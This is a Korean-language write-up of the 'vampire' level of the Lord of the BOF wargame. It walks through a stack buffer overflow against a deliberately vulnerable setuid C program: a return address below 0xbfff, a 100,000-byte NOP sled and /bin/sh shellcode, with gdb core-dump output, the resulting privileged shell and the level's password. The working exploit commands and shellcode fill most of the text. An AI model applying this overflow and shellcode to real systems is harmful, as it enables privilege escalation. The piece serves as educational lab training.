# Summary

**이전 문제와 동일한 내용은 생략하고 추가된 내용만 다루었다.**

> 문제의 소스코드

```c
[troll@localhost troll]$ cat vampire.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);
}
```

<br>

이전 문제와 비교하여 추가된 내용은 다음과 같다.

- `argv[1][46]`이 `\xff` 인지 체크 == `0xbfff????` 주소를 사용했는지 체크

<br>

# Analysis

이 문제는 [스택][stack]의 기본 구조만 인지하고 있으면 쉽게 풀 수 있는 문제이다.

[스택][stack]은 기본적으로 한쪽 끝에서만 데이터를 넣거나 빼는 선형 구조인 `LIFO(Last In First Out)` 방식이기 때문에 스택 프레임이 커질수록 높은주소에서 낮은주소로 늘어난다.

이 문제의 경우 `0xbfff????` 주소를 사용할 수 없기 때문에 더 낮은 주소인 `0xbffe????` 이하 주소를 사용해야한다.

<br>

필자의 경우 `tmp`디렉토리에 원본 바이너리를 복사 후 `\x90*20000`을 사용해 2만개의 NOP 코드를 넣고 `core dump`로 버퍼가 어느 주소까지 들어가는지 확인해보았다.

```python
[troll@localhost troll]$ mkdir tmp;cp vampire vampire.c ./tmp;
[troll@localhost troll]$ cd tmp
[troll@localhost tmp]$ ./vampire `python -c "print 'A'*44+'\xff\xff\xfe\xbf'+'\x90'*20000+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���������������������������
(... 중략 ...)
����������������������1�Ph//shh/bin��PS�ᙰ
                                              ̀
Segmentation fault (core dumped)
[troll@localhost tmp]$ gdb -q ./vampire ./core
Core was generated by `�������������������������������������������������������������������������������'.
Program terminated with signal 11, Segmentation fault.
Reading symbols from /lib/libc.so.6...done.
Reading symbols from /lib/ld-linux.so.2...done.
#0  0xbffeffff in ?? ()
(gdb) x/40wx 0xbfffffff-21400
0xbfffac67:	0xffac8040	0x066070bf	0x10698040	0x04855f40
0xbfffac77:	0xffac9008	0x1081ecbf	0xffacb840	0x0484cabf
0xbfffac87:	0x04855f08	0xffac9008	0x414141bf	0x41414141
0xbfffac97:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffaca7:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffacb7:	0x41414141	0xfeffff41	0x909090bf	0x90909090
0xbfffacc7:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffacd7:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffface7:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffacf7:	0x90909090	0x90909090	0x90909090	0x90909090
```

<br>

특정 지점에서 메모리 값을 확인해보니 데이터는 정상적으로 들어가 있었으나 시작 주소가 `0xbfff????`이므로

조건에 만족되지 않았다.

스택 프레임 크기를 더 늘려야 한다.

같은 방법으로 `NOP` 코드를 2만개가 아닌 10만개를 주었다.

```python
[troll@localhost tmp]$ ./vampire `python -c "print 'A'*44+'\xff\xff\xfe\xbf'+'\x90'*100000+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���������������������������
(... 중략 ...)
�������������������������1�Ph//shh/bin��PS�ᙰ
                                                    ̀
bash$ id
uid=508(troll) gid=508(troll) groups=508(troll)
```

<br>

`shell`이 정상적으로 실행되었으나 `tmp` 디렉토리에서 임시 파일이 실행되어 `uid`와 `euid`가 동일하다.

원본 바이너리에 해당 인자를 주어 실행한다면 `shell`을 획득할 수 있을 것이다.

<br>

# Exploit

```python
[troll@localhost troll]$ ./vampire `python -c "print 'A'*44+'\xff\xff\xfe\xbf'+'\x90'*100000+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���������������������������
(... 중략 ...)
����������������1�Ph//shh/bin��PS�ᙰ
                                                    ̀
bash$ id
uid=508(troll) gid=508(troll) euid=509(vampire) egid=509(vampire) groups=508(troll)
bash$ my-pass
euid = 509
music world
```

### Clear! password is….

music world



[stack]: https://ko.wikipedia.org/wiki/%EC%8A%A4%ED%83%9D